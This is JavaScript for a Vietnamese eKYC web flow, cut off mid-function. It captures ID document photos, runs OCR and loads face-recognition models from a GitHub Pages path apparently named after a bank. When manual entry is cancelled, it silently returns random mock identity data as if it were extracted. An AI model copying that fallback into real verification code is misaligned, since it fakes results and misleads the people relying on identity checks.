document.addEventListener('DOMContentLoaded', () => {    class EkycApp {        constructor() {            this.config = {                AUTO_CAPTURE_INTERVAL: 500,                MAX_CAPTURE_TIMEOUT: 30000,                ERROR_MESSAGE_TIMEOUT: 5000,                FACE_AUTO_CAPTURE_DELAY: 1500,                LIVENESS_ACTION_DURATION: 2000,                LIVENESS_COOLDOWN_DURATION: 1000,                FACE_DETECTION_INTERVAL: 100,                MAX_LIVENESS_ATTEMPTS: 3,                CARD_ASPECT_RATIO: 1.58,                CARD_DETECTION_THRESHOLD: 0.05,                CARD_SIZE_MIN_PERCENT: 0.4,                CARD_SIZE_MAX_PERCENT: 0.8,                BLUR_VARIANCE_THRESHOLD: 100, // Arbitrary threshold for blur detection                FACE_DETECTION_CONFIDENCE_THRESHOLD: 0.8            };            this.initLanguage();            this.cacheDOMElements();            this.initState();            this.initEventListeners();            this.updateUIWithLanguage();            this.initLibs();        }
    // Language Management
    initLanguage() {
        this.languages = {
            vi: {
                stepper_step1: "Bước 1/4: Chọn loại giấy tờ",
                stepper_step2: "Bước 2/4: Chụp ảnh giấy tờ",
                stepper_step3: "Bước 3/4: Xác nhận thông tin",
                stepper_step4: "Bước 4/4: Xác thực khuôn mặt",
                loading_resources: "Đang tải tài nguyên...",
                success_title: "Xác thực thành công!",
                success_subtitle: "Cảm ơn bạn đã hoàn tất quá trình xác thực eKYC.",
                docselect_title: "Xác thực giấy tờ",
                docselect_subtitle: "Chọn một trong các phương thức xác thực dưới đây",
                capture_front_title: "Chụp mặt trước",
                capture_back_title: "Chụp mặt sau",
                capture_instruction_front: "Đưa mặt trước giấy tờ vào khung hình",
                capture_instruction_back: "Đưa mặt sau giấy tờ vào khung hình",
                confirm_info_title: "Xác nhận thông tin",
                confirm_info_subtitle: "Vui lòng kiểm tra kỹ hình ảnh và thông tin.",
                face_liveness_title: "Xác thực khuôn mặt",
                face_liveness_subtitle: "Vui lòng giữ khuôn mặt trong khung hình oval.",
                error_no_face: "Không phát hiện khuôn mặt. Vui lòng thử lại.",
                error_blurry_image: "Ảnh bị mờ. Vui lòng chụp lại.",
                error_no_document: "Không phát hiện giấy tờ. Vui lòng thử lại.",
                error_capture_timeout: "Không thể chụp ảnh. Vui lòng thử lại.",
            },
            en: {
                stepper_step1: "Step 1/4: Select document type",
                stepper_step2: "Step 2/4: Capture document photos",
                stepper_step3: "Step 3/4: Confirm information",
                stepper_step4: "Step 4/4: Face verification",
                loading_resources: "Loading resources...",
                success_title: "Verification successful!",
                success_subtitle: "Thank you for completing the eKYC process.",
                docselect_title: "Document Verification",
                docselect_subtitle: "Choose one of the verification methods below",
                capture_front_title: "Capture front side",
                capture_back_title: "Capture back side",
                capture_instruction_front: "Place the front side inside the frame",
                capture_instruction_back: "Place the back side inside the frame",
                confirm_info_title: "Confirm information",
                confirm_info_subtitle: "Please check the images and information carefully.",
                face_liveness_title: "Face verification",
                face_liveness_subtitle: "Please keep your face inside the oval frame.",
                error_no_face: "No face detected. Please try again.",
                error_blurry_image: "Image is blurry. Please retake.",
                error_no_document: "No document detected. Please try again.",
                error_capture_timeout: "Unable to capture image. Please try again.",
            }
        };
        this.currentLang = 'vi';
    }

    toggleLanguage() {
        this.currentLang = this.currentLang === 'vi' ? 'en' : 'vi';
        this.dom.btnLang.textContent = this.currentLang === 'vi' ? 'Tiếng Việt' : 'English';
        this.updateUIWithLanguage();
    }

    updateUIWithLanguage() {
        document.querySelectorAll('[data-lang-key]').forEach(el => {
            const key = el.getAttribute('data-lang-key');
            if (this.languages[this.currentLang][key]) {
                el.textContent = this.languages[this.currentLang][key];
            }
        });
        this.updateStepper(this.languages[this.currentLang].stepper_step1);
    }

    updateStepper(text) {
        if (this.dom.stepper) {
            const stepText = this.dom.stepper.querySelector('span');
            if (stepText) {
                stepText.textContent = text;
            }
        }
    }

    updateProgressBar(step) {
        const progressSteps = document.querySelectorAll('.progress-step');
        progressSteps.forEach((stepEl, index) => {
            if (index < step) {
                stepEl.classList.add('active');
            } else {
                stepEl.classList.remove('active');
            }
        });
    }

    // DOM Elements Caching
    cacheDOMElements() {
        this.dom = {
            viewContainer: document.getElementById('viewContainer'),
            stepper: document.getElementById('stepper'),
            btnLang: document.getElementById('btnLang'),
            
            docSelectView: document.getElementById('docSelectView'),
            captureView: document.getElementById('captureView'),
            confirmView: document.getElementById('confirmView'),
            videoTutorialView: document.getElementById('videoTutorialView'),
            faceCaptureView: document.getElementById('faceCaptureView'),
            finalReviewView: document.getElementById('finalReviewView'),
            successView: document.getElementById('successView'),
            qrScannerModal: document.getElementById('qrScannerModal'),
            
            docOptions: document.querySelectorAll('.doc-option'),
            
            cameraVideo: document.getElementById('cameraVideo'),
            cameraCanvas: document.getElementById('cameraCanvas'),
            detectionCanvas: document.getElementById('detectionCanvas'), // Kept but added usage in detection
            
            cameraFrame: document.getElementById('cameraFrame'),
            cameraOverlay: document.getElementById('cameraOverlay'),
            
            faceCameraVideo: document.getElementById('faceCameraVideo'),
            faceCameraCanvas: document.getElementById('faceCameraCanvas'),
            
            qrVideo: document.getElementById('qrVideo'),
            qrMessage: document.getElementById('qrMessage'),
            
            btnCapture: document.getElementById('btnCapture'),
            btnBack: document.getElementById('btnBack'),
            btnUpload: document.getElementById('btnUpload'),
            btnConfirmInfo: document.getElementById('btnConfirmInfo'),
            btnStartFaceCapture: document.getElementById('btnStartFaceCapture'),
            btnConfirmLiveness: document.getElementById('btnConfirmLiveness'),
            btnFinalSubmit: document.getElementById('btnFinalSubmit'),
            btnRetryProcess: document.getElementById('btnRetryProcess'),
            btnFinalConfirm: document.getElementById('btnFinalConfirm'),
            btnCancelQR: document.getElementById('btnCancelQR'),
            
            captureTitle: document.getElementById('captureTitle'),
            captureSubtitle: document.getElementById('captureSubtitle'),
            captureInstruction: document.getElementById('captureInstruction'),
            faceCaptureTitle: document.getElementById('faceCaptureTitle'),
            faceCaptureSubtitle: document.getElementById('faceCaptureSubtitle'),
            faceCaptureInstruction: document.getElementById('faceCaptureInstruction'),
            
            confirmFrontImg: document.getElementById('confirmFrontImg'),
            confirmBackImg: document.getElementById('confirmBackImg'),
            confirmBackItem: document.getElementById('confirmBackItem'),
            infoIdNumber: document.getElementById('infoIdNumber'),
            infoFullName: document.getElementById('infoFullName'),
            infoDob: document.getElementById('infoDob'),
            
            errorMessage: document.getElementById('errorMessage'),
            loadingOverlay: document.getElementById('loadingOverlay'),
            
            cccdGuideModal: document.getElementById('cccdGuideModal'),
            passportGuideModal: document.getElementById('passportGuideModal'),
            driverLicenseGuideModal: document.getElementById('driverLicenseGuideModal'),
            fullscreenModal: document.getElementById('fullscreenModal'),
            fullscreenImage: document.getElementById('fullscreenImage'),
            
            livenessSteps: document.querySelectorAll('.liveness-step'),
            lottieProcessing: document.getElementById('lottieProcessing'),
            lottieSuccess: document.getElementById('lottieSuccess'),
            lottieLoading: document.getElementById('lottieLoading'),
            
            imageUpload: document.getElementById('imageUpload'),
            tutorialVideo: document.getElementById('tutorialVideo'),
            
            // Final Review elements
            reviewFrontImg: document.getElementById('reviewFrontImg'),
            reviewBackImg: document.getElementById('reviewBackImg'),
            reviewFaceImg: document.getElementById('reviewFaceImg'),
            reviewBackItem: document.getElementById('reviewBackItem'),
            frontQuality: document.getElementById('frontQuality'),
            backQuality: document.getElementById('backQuality'),
            faceQuality: document.getElementById('faceQuality'),
            matchScore: document.getElementById('matchScore'),
            scoreValue: document.getElementById('scoreValue'),
            scoreLabel: document.getElementById('scoreLabel'),
            matchDetails: document.getElementById('matchDetails'),
            reviewIdNumber: document.getElementById('reviewIdNumber'),
            reviewFullName: document.getElementById('reviewFullName'),
            reviewDob: document.getElementById('reviewDob')
        };
    }

    // State Management
    initState() {
        this.state = {
            currentView: 'docSelectView',
            selectedDocType: null,
            captureStep: 'front',
            capturedImages: { front: null, back: null, face: null },
            extractedInfo: { idNumber: '', fullName: '', dateOfBirth: '' },
            cameraStream: null,
            faceCameraStream: null,
            qrStream: null,
            isCapturing: false,
            livenessStep: 0,
            livenessCompleted: false,
            faceDetectionInterval: null,
            captureTimeout: null,
            imageQualityChecks: {
                front: { isValid: false, errors: [] },
                back: { isValid: false, errors: [] },
                face: { isValid: false, errors: [] }
            },
            faceMatchScore: 0,
            ocrWorker: null, // For Tesseract OCR
            faceDescriptorDocument: null,
            faceDescriptorLive: null
        };
    }

    // Event Listeners
    initEventListeners() {
        if (this.dom.btnLang) {
            this.dom.btnLang.addEventListener('click', () => this.toggleLanguage());
        }

        this.dom.docOptions.forEach(option => {
            option.addEventListener('click', (e) => this.handleDocumentSelection(e));
        });

        if (this.dom.btnCapture) {
            this.dom.btnCapture.addEventListener('click', () => this.capturePhoto());
        }
        
        if (this.dom.btnBack) {
            this.dom.btnBack.addEventListener('click', () => this.goBack());
        }

        if (this.dom.btnUpload) {
            this.dom.btnUpload.addEventListener('click', () => this.dom.imageUpload?.click());
        }

        if (this.dom.imageUpload) {
            this.dom.imageUpload.addEventListener('change', (e) => this.handleFileUpload(e));
        }

        // Guide link event listener
        const guideLink = document.getElementById('guideLink');
        if (guideLink) {
            guideLink.addEventListener('click', (e) => this.handleGuideLinkClick(e));
        }

        if (this.dom.btnConfirmInfo) {
            this.dom.btnConfirmInfo.addEventListener('click', () => this.showVideoTutorial());
        }

        if (this.dom.btnStartFaceCapture) {
            this.dom.btnStartFaceCapture.addEventListener('click', () => this.startFaceCapture());
        }

        if (this.dom.btnConfirmLiveness) {
            this.dom.btnConfirmLiveness.addEventListener('click', () => this.showFinalReview());
        }

        if (this.dom.btnFinalSubmit) {
            this.dom.btnFinalSubmit.addEventListener('click', () => this.finalConfirm());
        }

        if (this.dom.btnRetryProcess) {
            this.dom.btnRetryProcess.addEventListener('click', () => this.retryVerification());
        }

        if (this.dom.btnFinalConfirm) {
            this.dom.btnFinalConfirm.addEventListener('click', () => this.finalConfirm());
        }

        if (this.dom.btnCancelQR) {
            this.dom.btnCancelQR.addEventListener('click', () => this.cancelQRScan());
        }

        document.querySelectorAll('.btn-proceed').forEach(btn => {
            btn.addEventListener('click', (e) => this.handleModalProceed(e));
        });

        document.querySelectorAll('[data-retake]').forEach(btn => {
            btn.addEventListener('click', (e) => this.handleRetake(e));
        });

        document.querySelectorAll('.confirm-item img').forEach(img => {
            img.addEventListener('click', (e) => this.showFullscreenImage(e));
        });

        document.addEventListener('keydown', (e) => this.handleKeydown(e));
    }

    // Library Initialization
    async initLibs() {
        try {
            this.showLoading(this.languages[this.currentLang].loading_resources);
            
            if (typeof lottie !== 'undefined') {
                this.initLottieAnimations();
            }

            if (typeof faceapi !== 'undefined') {
                await this.initFaceAPI();
            }

            // Initialize OCR Worker
            await this.initOCRWorker();

            this.hideLoading();
        } catch (error) {
            console.error('Error initializing libraries:', error);
            this.hideLoading();
        }
    }

    // OCR Worker Initialization
    async initOCRWorker() {
        try {
            this.showLoading('Đang tải OCR...');
            this.state.ocrWorker = Tesseract.createWorker({
                logger: (m) => console.log('OCR Progress:', m)
            });
            await this.state.ocrWorker.load();
            await this.state.ocrWorker.loadLanguage('vie');
            await this.state.ocrWorker.initialize('vie');
            console.log('OCR Worker initialized successfully');
            this.hideLoading();
        } catch (error) {
            console.error('OCR Worker initialization failed:', error);
            this.hideLoading();
            // Continue without OCR - will use fallback
        }
    }

    initLottieAnimations() {
        if (this.dom.lottieLoading) {
            this.loadingAnimation = lottie.loadAnimation({
                container: this.dom.lottieLoading,
                renderer: 'svg',
                loop: true,
                autoplay: false,
                path: 'https://assets2.lottiefiles.com/packages/lf20_szlepvdj.json'
            });
        }

        if (this.dom.lottieSuccess) {
            this.successAnimation = lottie.loadAnimation({
                container: this.dom.lottieSuccess,
                renderer: 'svg',
                loop: false,
                autoplay: false,
                path: 'https://assets9.lottiefiles.com/packages/lf20_jbrw3hcz.json'
            });
        }

        if (this.dom.lottieProcessing) {
            this.processingAnimation = lottie.loadAnimation({
                container: this.dom.lottieProcessing,
                renderer: 'svg',
                loop: true,
                autoplay: false,
                path: 'https://assets4.lottiefiles.com/packages/lf20_a2chheio.json'
            });
        }
    }

    async initFaceAPI() {
        try {
            const MODEL_URL = 'https://vaytieudung.github.io/shinhanbank/web-sdk-version-3.2.0.0/models';
            await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
            await faceapi.nets.faceLandmark68Net.loadFromUri(MODEL_URL);
            await faceapi.nets.faceRecognitionNet.loadFromUri(MODEL_URL);
            await faceapi.nets.faceExpressionNet.loadFromUri(MODEL_URL);
        } catch (error) {
            console.error('Face API initialization failed:', error);
        }
    }

    // Non-optimized face descriptor extraction
    async getFaceDescriptor(imageSrc) {
        try {
            const img = await faceapi.fetchImage(imageSrc); // Handles data URLs
            const detection = await faceapi.detectSingleFace(img).withFaceLandmarks().withFaceDescriptor();
            return detection ? detection.descriptor : null;
        } catch (error) {
            console.error('Face descriptor extraction failed:', error);
            return null;
        }
    }

    // Document Selection
    handleDocumentSelection(e) {
        const docType = e.currentTarget.dataset.type;
        this.state.selectedDocType = docType;

        switch (docType) {
            case 'cccd':
                this.showModal('cccdGuideModal');
                break;
            case 'passport':
                this.showModal('passportGuideModal');
                break;
            case 'driver':
                this.showModal('driverLicenseGuideModal');
                break;
            case 'qr':
                this.startQRScan();
                break;
            case 'other':
                this.showModal('cccdGuideModal');
                break;
            default:
                this.showModal('cccdGuideModal');
        }
    }

    // Modal Management
    showModal(modalId) {
        const modal = this.dom[modalId];
        if (modal) {
            modal.classList.remove('hidden');
            document.body.style.overflow = 'hidden';
        }
    }

    hideModal(modalId) {
        const modal = this.dom[modalId];
        if (modal) {
            modal.classList.add('hidden');
            document.body.style.overflow = 'auto';
        }
    }

    handleModalProceed(e) {
        ['cccdGuideModal', 'passportGuideModal', 'driverLicenseGuideModal'].forEach(modalId => {
            this.hideModal(modalId);
        });
        this.startCapture();
    }

    // View Management
    showView(viewName) {
        Object.keys(this.dom).forEach(key => {
            if (key.endsWith('View') && this.dom[key]) {
                this.dom[key].classList.add('hidden');
            }
        });

        if (this.dom[viewName]) {
            this.dom[viewName].classList.remove('hidden');
            this.state.currentView = viewName;
        }
    }

    // Enhanced Camera Management
    async startCapture() {
        this.showView('captureView');
        this.state.captureStep = 'front';
        this.updateCaptureUI();
        this.updateStepper(this.languages[this.currentLang].stepper_step2);
        this.updateProgressBar(2);
        
        try {
            await this.initializeCamera('document');
        } catch (error) {
            console.error('Camera initialization failed:', error);
            this.showErrorModal('Không thể khởi tạo camera', 'Vui lòng kiểm tra quyền truy cập camera và thử lại.');
        }
    }

    // Enhanced camera initialization with proper error handling
    async initializeCamera(type) {
        try {
            // Stop existing stream if any
            const streamKey = type === 'face' ? 'faceCameraStream' : 'cameraStream';
            if (this.state[streamKey]) {
                this.state[streamKey].getTracks().forEach(track => track.stop());
                this.state[streamKey] = null;
            }

            const constraints = {
                video: {
                    width: { ideal: 1280, min: 640 },
                    height: { ideal: 720, min: 480 },
                    facingMode: type === 'face' ? 'user' : 'environment',
                    focusMode: 'continuous'
                }
            };

            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            this.state[streamKey] = stream;
            
            const videoElement = type === 'face' ? this.dom.faceCameraVideo : this.dom.cameraVideo;
            if (videoElement) {
                videoElement.srcObject = stream;
                
                // Wait for video to be ready with timeout
                await new Promise((resolve, reject) => {
                    videoElement.onloadedmetadata = () => {
                        videoElement.play().then(resolve).catch(reject);
                    };
                    setTimeout(() => reject(new Error('Camera timeout')), 10000);
                });
            }

            if (type === 'document') {
                this.startDocumentDetection();
            }
            
            return stream;
        } catch (error) {
            console.error(`${type} camera initialization error:`, error);
            const errorMessage = error.name === 'NotAllowedError' 
                ? 'Quyền truy cập camera bị từ chối. Vui lòng cho phép truy cập camera và thử lại.'
                : 'Không thể khởi tạo camera. Vui lòng kiểm tra thiết bị và thử lại.';
            this.showErrorModal('Lỗi Camera', errorMessage);
            throw error;
        }
    }

    // Legacy method for backward compatibility
    async initCamera() {
        return this.initializeCamera('document');
    }

    startDocumentDetection() {
        if (this.state.cameraStream && this.dom.cameraVideo) {
            this.state.captureTimeout = setInterval(() => {
                this.detectDocument();
            }, this.config.AUTO_CAPTURE_INTERVAL);
        }
    }

    // Non-optimized document detection using simple edge variance
    detectDocument() {
        if (!this.dom.detectionCanvas || !this.dom.cameraVideo) return;

        const canvas = this.dom.detectionCanvas;
        canvas.width = this.dom.cameraVideo.videoWidth;
        canvas.height = this.dom.cameraVideo.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(this.dom.cameraVideo, 0, 0);

        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const variance = this.calculateLaplacianVariance(imageData); // Reuse blur function for edges

        const isDocumentDetected = variance > this.config.CARD_DETECTION_THRESHOLD * 1000; // Arbitrary for edges
        
        if (isDocumentDetected) {
            this.dom.cameraFrame?.classList.add('ready-to-capture');
            this.updateCaptureInstruction('Giấy tờ được phát hiện - Nhấn chụp ảnh');
        } else {
            this.dom.cameraFrame?.classList.remove('ready-to-capture');
            this.updateCaptureInstruction(
                this.state.captureStep === 'front' 
                    ? this.languages[this.currentLang].capture_instruction_front
                    : this.languages[this.currentLang].capture_instruction_back
            );
        }
    }

    updateCaptureUI() {
        const isBack = this.state.captureStep === 'back';
        
        if (this.dom.captureTitle) {
            this.dom.captureTitle.textContent = isBack 
                ? this.languages[this.currentLang].capture_back_title
                : this.languages[this.currentLang].capture_front_title;
        }

        if (this.dom.captureSubtitle) {
            this.dom.captureSubtitle.textContent = isBack
                ? 'Chụp mặt sau của giấy tờ'
                : 'Chụp mặt trước của giấy tờ';
        }

        this.updateCaptureInstruction(
            isBack 
                ? this.languages[this.currentLang].capture_instruction_back
                : this.languages[this.currentLang].capture_instruction_front
        );
    }

    updateCaptureInstruction(text) {
        if (this.dom.captureInstruction) {
            this.dom.captureInstruction.textContent = text;
        }
    }

    async capturePhoto() {
        if (!this.state.cameraStream || this.state.isCapturing) return;

        this.state.isCapturing = true;
        
        try {
            const canvas = this.dom.cameraCanvas;
            const video = this.dom.cameraVideo;
            
            if (canvas && video) {
                const ctx = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                ctx.drawImage(video, 0, 0);
                
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                this.state.capturedImages[this.state.captureStep] = imageData;

                this.dom.cameraFrame?.classList.add('blink-once');
                setTimeout(() => {
                    this.dom.cameraFrame?.classList.remove('blink-once');
                }, 500);

                await this.processImage(imageData);
            }
        } catch (error) {
            console.error('Capture failed:', error);
            this.showError(this.languages[this.currentLang].error_capture_timeout);
        } finally {
            this.state.isCapturing = false;
        }
    }

    async processImage(imageData) {
        this.showLoading('Đang xử lý ảnh...');
        
        // Image quality check with non-optimized blur detection
        const qualityCheck = await this.checkImageQuality(imageData, this.state.captureStep);
        
        if (!qualityCheck.isValid) {
            this.hideLoading();
            this.showImageErrors(qualityCheck.errors);
            return;
        }

        // Store quality check results
        this.state.imageQualityChecks[this.state.captureStep] = qualityCheck;
        
        // Extract information from image using OCR/AI simulation
        if (this.state.captureStep === 'front') {
            const extractedInfo = await this.extractInfoFromImage(imageData);
            this.state.extractedInfo = extractedInfo;
            // Extract face descriptor from document (non-optimized full image process)
            this.state.faceDescriptorDocument = await this.getFaceDescriptor(imageData);
        }

        this.hideLoading();

        if (this.state.captureStep === 'front' && this.needsBackCapture()) {
            this.state.captureStep = 'back';
            this.updateCaptureUI();
        } else {
            this.stopCamera();
            this.showConfirmation();
        }
    }

    // Non-optimized Laplacian variance for blur detection (double loop over pixels)
    calculateLaplacianVariance(imageData) {
        const width = imageData.width;
        const height = imageData.height;
        const data = imageData.data;
        let sum = 0;
        let sumSq = 0;
        let count = 0;

        for (let y = 1; y < height - 1; y++) {
            for (let x = 1; x < width - 1; x++) {
                const i = (y * width + x) * 4;
                const grayCenter = data[i] * 0.3 + data[i + 1] * 0.59 + data[i + 2] * 0.11;
                const grayUp = data[i - width * 4] * 0.3 + data[i - width * 4 + 1] * 0.59 + data[i - width * 4 + 2] * 0.11;
                const grayDown = data[i + width * 4] * 0.3 + data[i + width * 4 + 1] * 0.59 + data[i + width * 4 + 2] * 0.11;
                const grayLeft = data[i - 4] * 0.3 + data[i - 3] * 0.59 + data[i - 2] * 0.11;
                const grayRight = data[i + 4] * 0.3 + data[i + 5] * 0.59 + data[i + 6] * 0.11;

                const lap = grayUp + grayDown + grayLeft + grayRight - 4 * grayCenter;
                sum += lap;
                sumSq += lap * lap;
                count++;
            }
        }

        if (count === 0) return 0;
        const mean = sum / count;
        return sumSq / count - mean * mean;
    }

    // Enhanced image quality check with blur and face detection
    async checkImageQuality(imageSrc, imageType) {
        const img = new Image();
        img.src = imageSrc;
        await new Promise((resolve) => { img.onload = resolve; });

        const canvas = document.createElement('canvas');
        canvas.width = img.width;
        canvas.height = img.height;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(img, 0, 0);

        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
        const blurVariance = this.calculateLaplacianVariance(imageData);

        const errors = [];
        if (blurVariance < this.config.BLUR_VARIANCE_THRESHOLD) {
            errors.push(this.languages[this.currentLang].error_blurry_image);
        }

        if (imageType === 'face') {
            const detection = await faceapi.detectSingleFace(img);
            if (!detection) {
                errors.push(this.languages[this.currentLang].error_no_face);
            } else if (detection.score < this.config.FACE_DETECTION_CONFIDENCE_THRESHOLD) {
                errors.push('Low face detection confidence. Please try again.');
            }
        }

        const isValid = errors.length === 0;
        return { isValid, errors };
    }

    // Extract information from document image
    async preprocessImageForOCR(imageData) {
        return new Promise((resolve) => {
            const img = new Image();
            img.onload = () => {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = img.width;
                canvas.height = img.height;
                ctx.drawImage(img, 0, 0);
                
                // Apply contrast and brightness enhancements
                const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                const data = imageData.data;
                
                for (let i = 0; i < data.length; i += 4) {
                    data[i] = Math.min(255, Math.max(0, (data[i] - 128) * 1.2 + 128 + 10));
                    data[i + 1] = Math.min(255, Math.max(0, (data[i + 1] - 128) * 1.2 + 128 + 10));
                    data[i + 2] = Math.min(255, Math.max(0, (data[i + 2] - 128) * 1.2 + 128 + 10));
                }
                
                ctx.putImageData(imageData, 0, 0);
                resolve(canvas.toDataURL('image/jpeg', 0.95));
            };
            img.src = imageData;
        });
    }

    async extractInfoFromImage(imageData) {
        this.showLoading('Đang trích xuất thông tin từ giấy tờ...');
        try {
            if (!this.state.ocrWorker) {
                await this.initOCRWorker();
            }

            if (this.state.ocrWorker) {
                const processedImage = await this.preprocessImageForOCR(imageData);
                const ocrOptions = {
                    tessedit_char_whitelist: 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789àáạảãâầấậẩẫăằắặẳẵèéẹẻẽêềếệểễìíịỉĩòóọỏõôồốộổỗơờớợởỡùúụủũưừứựửữỳýỵỷỹđĐ /:.-',
                    tessedit_pageseg_mode: '6'
                };
                const { data: { text, confidence } } = await this.state.ocrWorker.recognize(processedImage, ocrOptions);
                console.log('OCR Text:', text);
                console.log('OCR Confidence:', confidence);

                if (confidence > 20 && text.trim().length > 10) {
                    const extractedData = this.parseVietnameseID(text);
                    if (this.validateExtractedData(extractedData)) {
                        this.hideLoading();
                        return extractedData;
                    }
                }
            }
        } catch (error) {
            console.error('OCR Error:', error);
            this.showError('Lỗi khi trích xuất thông tin từ ảnh. Vui lòng thử lại hoặc nhập thủ công.');
        }
        this.hideLoading();
        return await this.showManualInputModal();
    }

    // Parse Vietnamese ID text using regex patterns
    parseVietnameseID(text) {
        const patterns = {
            idNumber: /(?:SỐ|SO|CCCD|CMND)[:\s]*([0-9]{9,12})/i,
            fullName: /(?:HỌ VÀ TÊN|HO VA TEN|TÊN|TEN)[:\s]*([A-ZÀÁẠẢÃÂẦẤẬẨẪĂẰẮẶẲẴÈÉẸẺẼÊỀẾỆỂỄÌÍỊỈĨÒÓỌỎÕÔỒỐỘỔỖƠỜỚỢỞỠÙÚỤỦŨƯỪỨỰỬỮỲÝỴỶỸĐĐ\s]+)/i,
            dateOfBirth: /(?:NGÀY SINH|NGAY SINH|SINH|BORN)[:\s]*(\d{1,2}[\/-]\d{1,2}[\/-]\d{4})/i // Tightened to 4-digit year
        };

        const idNumberMatch = text.match(patterns.idNumber);
        const fullNameMatch = text.match(patterns.fullName);
        const dobMatch = text.match(patterns.dateOfBirth);

        return {
            idNumber: idNumberMatch ? idNumberMatch[1].trim() : '',
            fullName: fullNameMatch ? fullNameMatch[1].trim() : '',
            dateOfBirth: dobMatch ? dobMatch[1].trim() : ''
        };
    }

    // Validate extracted data
    validateExtractedData(data) {
        if (!data.idNumber || data.idNumber.length < 9) return false;
        if (!data.fullName || data.fullName.length < 3) return false;
        if (!data.dateOfBirth || !/^\d{1,2}[\/-]\d{1,2}[\/-]\d{4}$/.test(data.dateOfBirth)) return false;
        return true;
    }

    // Show manual input modal for OCR fallback (create dynamically if missing)
    showManualInputModal() {
        return new Promise((resolve) => {
            let modal = document.getElementById('manualInputModal');
            if (!modal) {
                modal = this.createManualInputModal();
                document.body.appendChild(modal);
            }
            
            modal.classList.remove('hidden');
            
            // Clear previous values
            const idInput = document.getElementById('manualIdNumber');
            const nameInput = document.getElementById('manualFullName');
            const dobInput = document.getElementById('manualDob');
            idInput.value = '';
            nameInput.value = '';
            dobInput.value = '';
            
            // When manual input is submitted
            const submitBtn = document.getElementById('manualSubmitBtn');
            const cancelBtn = document.getElementById('manualCancelBtn');
            
            const submitHandler = () => {
                // Get user-entered values
                const idNumber = idInput.value.trim();
                const fullName = nameInput.value.trim();
                const dateOfBirth = dobInput.value.trim();
                
                // Basic validation
                if (!idNumber || !fullName || !dateOfBirth) {
                    this.showErrorModal('Thông Tin Không Đầy Đủ', 'Vui lòng điền đầy đủ thông tin trước khi tiếp tục.');
                    return;
                }
                
                const enteredData = { idNumber, fullName, dateOfBirth };
                modal.classList.add('hidden');
                
                // Remove event listeners
                submitBtn.removeEventListener('click', submitHandler);
                if (cancelBtn) cancelBtn.removeEventListener('click', cancelHandler);
                
                resolve(enteredData);
            };
            
            const cancelHandler = () => {
                modal.classList.add('hidden');
                submitBtn.removeEventListener('click', submitHandler);
                if (cancelBtn) cancelBtn.removeEventListener('click', cancelHandler);
                resolve(this.simulateOCRExtraction());
            };
            
            submitBtn.addEventListener('click', submitHandler);
            if (cancelBtn) cancelBtn.addEventListener('click', cancelHandler);
        });
    }

    // Create manual input modal dynamically
    createManualInputModal() {
        const modal = document.createElement('div');
        modal.id = 'manualInputModal';
        modal.className = 'modal hidden';
        modal.innerHTML = `
            <div class="modal-content">
                <h2>Nhập thông tin thủ công</h2>
                <label for="manualIdNumber">Số CMND/CCCD:</label>
                <input type="text" id="manualIdNumber">
                <label for="manualFullName">Họ và tên:</label>
                <input type="text" id="manualFullName">
                <label for="manualDob">Ngày sinh (dd/mm/yyyy):</label>
                <input type="text" id="manualDob">
                <button id="manualSubmitBtn">Xác nhận</button>
                <button id="manualCancelBtn">Hủy</button>
            </div>
        `;
        return modal;
    }

    // Simulate OCR extraction (fallback)
    simulateOCRExtraction() {
        const mockData = [
            { idNumber: '123456789012', fullName: 'NGUYỄN VĂN A', dateOfBirth: '01/01/1990' },
            { idNumber: '987654321098', fullName: 'TRẦN THỊ B', dateOfBirth: '15/05/1985' },
            { idNumber: '456789123456', fullName: 'LÊ VĂN C', dateOfBirth: '20/12/1992' }
        ];
        return mockData[Math.floor(Math.random() * mockData.length)];
    }

    // Image quality errors with modal
    showImageErrors(errors) {
        const errorList = errors.map(error => `<li>${error}</li>`).join('');
        this.showConfirmationModal(
            'Chất Lượng Ảnh Không Đạt Yêu Cầu',
            `
                <div class="image-error-details">
                    <p>Chất lượng ảnh không đạt yêu cầu:</p>
                    <ul>${errorList}</ul>
                    <p>Vui lòng chụp lại ảnh.</p>
                </div>
            `,
            [
                {
                    text: 'Chụp Lại',
                    class: 'btn-retry',
                    action: () => this.hideConfirmationModal()
                }
            ]
        );
    }

    needsBackCapture() {
        return ['cccd', 'other'].includes(this.state.selectedDocType);
    }

    stopCamera() {
        if (this.state.cameraStream) {
            this.state.cameraStream.getTracks().forEach(track => track.stop());
            this.state.cameraStream = null;
        }
        
        if (this.state.captureTimeout) {
            clearInterval(this.state.captureTimeout);
            this.state.captureTimeout = null;
        }

        if (this.state.faceDetectionInterval) {
            clearInterval(this.state.faceDetectionInterval);
            this.state.faceDetectionInterval = null;
        }
    }

    // File Upload
    handleFileUpload(e) {
        const file = e.target.files[0];
        if (file && file.type.startsWith('image/')) {
            const reader = new FileReader();
            reader.onload = (event) => {
                const imageData = event.target.result;
                this.state.capturedImages[this.state.captureStep] = imageData;
                this.processImage(imageData);
            };
            reader.readAsDataURL(file);
        }
    }

    // Confirmation View
    showConfirmation() {
        this.showView('confirmView');
        this.updateStepper(this.languages[this.currentLang].stepper_step3);
        this.updateProgressBar(3);
        
        if (this.dom.confirmFrontImg && this.state.capturedImages.front) {
            this.dom.confirmFrontImg.src = this.state.capturedImages.front;
        }
        
        if (this.dom.confirmBackImg && this.state.capturedImages.back) {
            this.dom.confirmBackImg.src = this.state.capturedImages.back;
        } else if (this.dom.confirmBackItem && !this.needsBackCapture()) {
            this.dom.confirmBackItem.style.display = 'none';
        }

        this.updateExtractedInfo();
    }

    updateExtractedInfo() {
        if (this.dom.infoIdNumber) {
            this.dom.infoIdNumber.textContent = this.state.extractedInfo.idNumber || 'Đang xử lý...';
        }
        if (this.dom.infoFullName) {
            this.dom.infoFullName.textContent = this.state.extractedInfo.fullName || 'Đang xử lý...';
        }
        if (this.dom.infoDob) {
